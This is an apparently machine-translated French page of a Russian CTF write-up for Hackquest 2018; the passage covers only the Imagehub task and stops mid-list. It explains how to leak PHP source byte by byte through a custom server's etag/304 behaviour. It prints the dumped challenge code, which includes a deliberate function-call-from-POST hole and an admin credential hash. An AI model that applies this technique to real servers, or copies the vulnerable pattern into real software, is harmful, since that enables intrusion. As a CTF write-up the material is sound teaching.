<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üì™ üòß üé† Hackquest 2018. R√©sultats et √©critures. Jour 4-7 üêò ‚ÜïÔ∏è üòí</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Comme promis, nous publions la deuxi√®me partie des d√©cisions annuelles de hackquest. Jour 4-7: la tension monte et les t√¢ches sont plus int√©ressantes!...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hackquest 2018. R√©sultats et √©critures. Jour 4-7</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/440312/">  Comme promis, nous publions la deuxi√®me partie des d√©cisions annuelles de hackquest.  Jour 4-7: la tension monte et les t√¢ches sont plus int√©ressantes! <br><img src="https://habrastorage.org/webt/oa/br/8l/oabr8lkxzurvxgw-20o0jq23hgo.jpeg"><br><a name="habracut"></a><br><h2>  Contenu: </h2><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Jour 4.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Imagehub</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Jour 5.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Le temps</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Jour 6.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Awesome vm</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Jour 7.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Hiddenresource</a> </li></ul><br><img src="https://habrastorage.org/webt/xv/67/n9/xv67n9j_kw2fxrljp9zrrqewzxk.jpeg"><br><h2><a name="Imagehub"></a>  Jour 4.  Imagehub </h2><br>  Cette t√¢che a √©t√© pr√©par√©e par <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">SPbCTF</a> . <br><br>  <i>Notre nouvelle cr√©ation va tuer Instagram.</i>  <i>Nous vous convaincrons en deux mots:</i> <i><br><br></i>  <i>1. Filtres.</i>  <i>De nouveaux filtres in√©dits pour vos photos t√©l√©charg√©es.</i> <i><br></i>  <i>2. Mise en cache.</i>  <i>Le serveur HTTP personnalis√© garantit que les fichiers image atterrissent dans le cache du navigateur.</i> <i><br><br></i>  <i>Essayez-le maintenant!</i>  <i>imagehub.spb.ctf.su</i> <i><br><br></i>  <i>Ex√©cutez / get_the_flag pour gagner.</i> <i><br></i>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Binaire</a> serveur personnalis√©: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">dppth</a></i> <br><br>  <b>Astuces</b> <br>  <i><b>25/10/2018 20:00</b></i> <i><br></i>  <i>La t√¢che n'a pas √©t√© r√©solue.</i>  <i>24 heures suppl√©mentaires.</i> <i><br><br></i>  <i><b>25/10/2018 17:00</b></i> <i><br></i>  <i>Nous connaissons deux bogues.</i>  <i>Le premier vous fournit les sources de l'application Web, le second vous obtient le RCE.</i> <br><br><h4>  Pr√©sentation: </h4><br>  Ex√©cutable: <br><br><ul><li>  ELF x86_64 </li><li>  Impl√©mente un serveur http simple </li><li>  Si le fichier demand√© a un bit ex√©cutable, il est transmis √† php-fpm </li><li>  Le code impl√©mente la mise en cache etag personnalis√©e </li></ul><br>  Partie Web: <br><br><ul><li>  Poss√®de une fonctionnalit√© de t√©l√©chargement de fichiers.  L'image peut √™tre modifi√©e √† l'aide de filtres pr√©d√©finis. </li><li>  Page d'administration avec Basic sur /? Admin = show </li></ul><br><h4>  Vuln√©rabilit√©: lecture du code source </h4><br>  La fonctionnalit√© de cache semble int√©ressante, car nous pouvons amener le serveur √† hacher une plage arbitraire de fichiers (m√™me une plage de 1 octet). <br><br> <code>Etag = sprintf("%08x%08x%08x", file_mtime, hash, file_size);</code> <br> <div class="spoiler">  <b class="spoiler_title">Hash_function:</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">etag_hash</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data)</span></span></span><span class="hljs-function">:</span></span> v16 = [<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _ <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">16</span></span>)] v16[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span> v16[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0x1DB71064</span></span> v16[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0x3B6E20C8</span></span> v16[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0x26D930AC</span></span> v16[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0x76DC4190</span></span> v16[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0x6B6B51F4</span></span> v16[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0x4DB26158</span></span> v16[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0x5005713C</span></span> v16[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0xEDB88320</span></span> v16[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0xF00F9344</span></span> v16[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0xD6D6A3E8</span></span> v16[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0xCB61B38C</span></span> v16[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0x9B64C2B0</span></span> v16[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0x86D3D2D4</span></span> v16[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0xA00AE278</span></span> v16[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0xBDBDF21C</span></span> hash = <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(data)): v5 = ((hash &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[(hash ^ data[i]) &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span>]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> hash = ((v5 &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[v5 &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span> ^ (data[i] &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>)]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (~hash) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span></code> </pre> <br></div></div><br>  Malheureusement, etag est supprim√© pour les fichiers ex√©cutables (* .php): <br><br><pre> <code class="plaintext hljs">stat_0(v2, &amp;stat_buf); if ( stat_buf.st_mode &amp; S_IEXEC ) { setHeader(a2-&gt;respo, "cache-control", "no-store"); deleteHeade(a2-&gt;respo, "etag"); set_environment_info(a1); dup2(fd, 0); snprintf(s, 4096, "/usr/bin/php-cgi %s", a1-&gt;url);</code> </pre> <br>  Il y a toujours une v√©rification avant l'ex√©cution de la page, donc si nous devinons correctement la valeur etag ( <b>if-none-match</b> ), alors le serveur nous servira une r√©ponse de statut <b>304 Non Modifi√©</b> .  En utilisant cela, nous pouvons brutaliser le code source octet par octet. <br><br><pre> <code class="plaintext hljs">v11 = getHeader(&amp;s.request, "if-modified-since"); if ( v11 ) { v3 = getHeader(&amp;v14, "last-modified"); if ( !strcmp(v11, v3) ) send_status(304); } v12 = getHeader(&amp;s.request, "if-none-match"); if ( v12 ) { v4 = getHeader(&amp;v14, "etag"); if ( !strcmp(v12, v4) ) send_status(304); } exec_and_prepare_response_body(&amp;s, &amp;a2a);</code> </pre> <br>  R√©sumons ce que nous avons obtenu de RE: <br><br><ol><li>  L'horodatage est facilement lisible √† partir de l'en-t√™te de r√©ponse modifi√© en dernier (cha√Æne -&gt; horodatage). </li><li>  La plage permet d'avoir une longueur d'un octet (nous obtiendrons donc du hachage pour un seul octet) </li><li>  Le hachage peut √™tre devin√© pour une plage de 1 octet (256 valeurs possibles) </li><li>  La taille est ex√©cutable par brute, mais nous devons conna√Ætre au moins un octet du fichier cible. </li><li>  Puisque nous aimerions obtenir la source des fichiers * .php, c'est une bonne hypoth√®se, que le fichier commence par "&lt;? Php". </li></ol><br>  La premi√®re √©tape consistera √† obtenir la taille et la seconde √† obtenir le contenu r√©el du fichier. <br>  Avec du code multi-thread, j'ai atteint la vitesse de ~ 1 car / sec, et j'ai vid√© certains fichiers: <br><div class="spoiler">  <b class="spoiler_title">index.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">// error_reporting(0); if (isset($_GET["admin"]) &amp;&amp; (!isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW'] !== '888b2f04eef9a49fc87fa81089b736de')) { header('WWW-Authenticate: Basic realm="Admin Area"'); header('HTTP/1.0 401 Unauthorized'); } require "upload.php"; $uploader = new ImageUploader(); $result = $uploader-&gt;upload(); if ($result === true) die(); if ($result &gt; 0) { echo "Error: " . $result; } if ($uploader-&gt;upload() !== true) { include "templates/main.php"; }</span></span></code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">upload.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/uploaderror.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/verify.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/filters.php"</span></span>; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ImageUploader</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> TARGET_DIR = <span class="hljs-string"><span class="hljs-string">"51a8ae2cab09c6b728919fe09af57ded/"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">upload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $result = verify_parameters(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($result !== <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $result; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!move_uploaded_file($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>], $target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::MOVE_ERROR; } $text = $_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]; $filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text); $imagick = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> \Imagick(realpath($target_file)); $imagick-&gt;scaleimage($size, $size); $imagick-&gt;setImageOpacity(<span class="hljs-number"><span class="hljs-number">0.5</span></span>); $imagick-&gt;compositeImage($filterImage, imagick::CHANNEL_ALPHA, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); header(<span class="hljs-string"><span class="hljs-string">"Content-Type: image/jpeg"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $imagick-&gt;getImageBlob(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } }</code> </pre> </div></div><br><div class="spoiler">  <b class="spoiler_title">comprend / filters.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">make_text</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($image, $size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $draw = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickDraw(); $draw-&gt;setFillColor(<span class="hljs-string"><span class="hljs-string">'white'</span></span>); $draw-&gt;setFontSize( <span class="hljs-number"><span class="hljs-number">18</span></span> ); $image-&gt;annotateImage($draw, $size / <span class="hljs-number"><span class="hljs-number">2</span></span> - <span class="hljs-number"><span class="hljs-number">65</span></span>, $size - <span class="hljs-number"><span class="hljs-number">20</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, $text); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">futut</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">incasinato</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(130,100,255,3)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">fertocht</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $s = $size % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">"rgba($s,$s,$s,127)"</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">jebeno</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(0,255,255,255)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i*<span class="hljs-number"><span class="hljs-number">10</span></span>) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-($size-$j)) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">kuthamanga</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]+$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; }</code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">comprend / uploaderror.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UploadError</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> POST_SUBMIT = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> IMAGE_NOT_FOUND = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> NOT_IMAGE = <span class="hljs-number"><span class="hljs-number">2</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> FILE_EXISTS = <span class="hljs-number"><span class="hljs-number">3</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> BIG_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_EXTENSION = <span class="hljs-number"><span class="hljs-number">5</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_MIMETYPE = <span class="hljs-number"><span class="hljs-number">6</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INVALID_PARAMS = <span class="hljs-number"><span class="hljs-number">7</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_SIZE = <span class="hljs-number"><span class="hljs-number">8</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> MOVE_ERROR = <span class="hljs-number"><span class="hljs-number">9</span></span>; }</code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">inclut / v√©rifier.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">verify_parameters</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'submit'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::POST_SUBMIT; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_FILES[<span class="hljs-string"><span class="hljs-string">'imageFile'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::IMAGE_NOT_FOUND; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $imageFileType = strtolower(pathinfo($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>], PATHINFO_EXTENSION)); $imageFileInfo = getimagesize($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($imageFileInfo === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::NOT_IMAGE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"size"</span></span>] &gt; <span class="hljs-number"><span class="hljs-number">1024</span></span>*<span class="hljs-number"><span class="hljs-number">32</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::BIG_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!in_array($imageFileType, [<span class="hljs-string"><span class="hljs-string">'jpg'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_EXTENSION; } $imageMimeType = $imageFileInfo[<span class="hljs-string"><span class="hljs-string">'mime'</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($imageMimeType !== <span class="hljs-string"><span class="hljs-string">'image/jpeg'</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_MIMETYPE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (file_exists($target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::FILE_EXISTS; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INVALID_PARAMS; } $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (($size &lt;= <span class="hljs-number"><span class="hljs-number">0</span></span>) || ($size &gt; <span class="hljs-number"><span class="hljs-number">512</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; }</code> </pre> <br></div></div><br>  Cela nous donne: <br><ul><li>  Nom d'utilisateur / mot de passe pour Admin 